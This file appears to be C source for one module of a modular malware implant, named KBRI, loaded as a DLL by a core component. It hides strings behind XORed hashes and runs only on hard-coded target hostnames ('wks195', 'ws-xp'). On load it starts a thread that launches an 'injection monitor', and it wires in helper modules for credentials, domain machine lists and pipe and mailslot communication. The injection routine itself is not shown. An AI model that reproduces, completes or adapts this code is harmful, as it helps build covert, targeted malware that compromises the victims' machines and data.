/*
	mod_KBRI.c
	Main file for module KBRI
	NB: configuration of this project defines ROUTINES_BY_PTR, so all libs will use definition of a ptr instead of code itself,
	and it is essential to perform proper initialization of all pointers, received from main (core) module

*/


// perform essential compiler settings
// remove stdlib 
#pragma comment(linker, "/NODEFAULTLIB:libcmt.lib") 
#pragma comment(linker, "/NODEFAULTLIB:MSVCRT.lib")
#pragma comment(linker, "/NODEFAULTLIB:MSVCRTD.lib")
#pragma comment(linker, "/NODEFAULTLIB:libcmtd.lib")

#if defined(_M_X64)
	// x64 system libs
	#pragma comment (lib, "..\\lib\\amd64\\BufferOverflowU.lib")
	#pragma comment (lib, "..\\lib\\amd64\\ntdll.lib")
	#define TARGET_ARCH ARCH_TYPE_X64
#elif defined(_M_IX86)
	// x32 system libs
	#pragma comment (lib, "..\\lib\\i386\\BufferOverflowU.lib")
	#pragma comment (lib, "..\\lib\\i386\\ntdll.lib")
	#define TARGET_ARCH ARCH_TYPE_X32
#else
	#error Unknown target CPU, no system libs can be found
#endif

#include <windows.h>

#include "..\inc\dbg.h"
#include "..\inc\mem.h"
#include "..\inc\HashedStrings.h"
#include "..\shared\ModuleAPI.h"

// internal code modules
#include "KBRI.h"










#include "mod_KBRI.h"

/*
	Imports init function, should contain calls to ALL modules which is used by internal calls (reference build output to check
	which modules are compiled in ROUTINES_BY_PTR when particular module is being build)
*/
BOOL modInitImports(CORE_APIS *pCoreAPIs)
{
	BOOL bRes = TRUE;	// ok by default

	HashedStrings_resolve(pCoreAPIs->HashedStrings_apis);
//	PipeWorks_resolve(pCoreAPIs->PipeWorks_apis);
//	DomainListMachines_resolve(pCoreAPIs->DomainListMachines_apis);
//	CredManager_resolve(pCoreAPIs->CredManager_apis);
	EmbeddedResources_resolve(pCoreAPIs->EmbeddedResources_apis);
	MyStringRoutines_resolve(pCoreAPIs->MyStringRoutines_apis);
	CryptoStrings_resolve(pCoreAPIs->CryptoStrings_apis);
	RndClass_resolve(pCoreAPIs->RndClass_apis);
//	MailslotWorks_resolve(pCoreAPIs->MailslotWorks_apis); 
	DataCallbackManager_resolve(pCoreAPIs->DataCallbackManager_apis);	
	CommStructures_resolve(pCoreAPIs->CommStructures_apis);

	return bRes;
}

/*
	Queries hostname (or some other identities) to detect if we are allowed to be executed here
*/
#define KBRI_RND_XOR STRHASH_PARAM(0x2e555d24997b6c7)
BOOL bCheckAllowedToRun()
{
	BOOL bRes = FALSE;
	LPWSTR wszCName = NULL;
	DWORD dwLen = 512;
	UINT64 i64CNameHash;

	do {	// not a loop

		if (!(wszCName = (LPWSTR)my_alloc(1024))) { DbgPrint("ERR: failed to alloc buffer"); break; }

		if (!GetComputerName(wszCName, &dwLen)) { DbgPrint("ERR: failed to query host name"); break; }

		// check name's hash
		sr_lowercase(wszCName);
		i64CNameHash = HashStringW_const(wszCName) ^ KBRI_RND_XOR;
		switch (i64CNameHash) {
		case HASHSTR_CONST("wks195", 0xaea2baeb7e7c0027) ^ KBRI_RND_XOR:
		case HASHSTR_CONST("ws-xp", 0xb032bc571e0d2e23) ^ KBRI_RND_XOR:
			DbgPrint("allowed to run");
			bRes = TRUE;
			break;
		default: DbgPrint("[%ws] not allowed", wszCName);
		}

	} while (FALSE);	// not a loop

	if (wszCName) { my_free(wszCName); }

	return bRes;
}


/*
	Routine to be execute when all init are finished
*/
DWORD WINAPI thrModuleRun(LPVOID lpParameter)
{
	DbgPrint("entered");



	// checks if hostname is in a list of allowed targets
	if (!bCheckAllowedToRun()) { DbgPrint("not allowed to run, exiting"); return 0; }



	// start injection monitor
	kbriStartInjMonitor();

	DbgPrint("finished");



	return 0;
}



// entrypoint function for module
BOOL WINAPI DllEntry(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	BOOL bRes = TRUE;	// need return TRUE to proceed next
	CORE_APIS *pCoreAPIs = (CORE_APIS *)lpvReserved;
	DWORD dwThreadId;

	if (fdwReason == DLL_PROCESS_ATTACH) {

		DbgPrint("DLL_PROCESS_ATTACH: entered");

		// do apis init in ALL used modules 
		modInitImports(pCoreAPIs);

		// start work thread
		CloseHandle(CreateThread(NULL, 0, thrModuleRun, NULL, 0, &dwThreadId));

#ifdef _DEBUG
		CloseHandle(CreateThread(NULL, 0, memPrintAllocationListDialog, NULL, 0, &dwThreadId));
#endif

		DbgPrint("DLL_PROCESS_ATTACH: done");

	}	// DLL_PROCESS_ATTACH

	return bRes;
}






